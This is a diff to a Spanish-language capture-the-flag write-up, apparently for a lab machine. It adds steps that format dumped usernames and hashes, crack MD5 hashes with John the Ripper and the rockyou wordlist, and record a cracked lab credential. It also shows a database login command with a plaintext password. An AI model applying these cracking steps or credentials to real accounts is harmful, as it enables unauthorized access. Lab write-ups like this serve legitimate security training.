@@ -356,8 +356,25 @@ sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SEL
 
 Encontrando una lista de usuarios y hashes que no teníamos
 Nos los guardaremos en un archivo
+```shell
+cat users.txt| awk '{print $1 ":" $2}' 
+```
 
-Vamos a crackearlos una vº
+Validamos el hash, en este caso es MD5
+Y lo crackeamos
+```shell
+john -w:/usr/share/wordlists/rockyou.txt users.txt --format=Raw-MD5
+```
+
+Encontrando las credenciales
+```ad-hint
+nikk37::get_dem_girls2@yahoo.com
+```
+
+Las validaremos
+```shell
+
+```
 
 
 
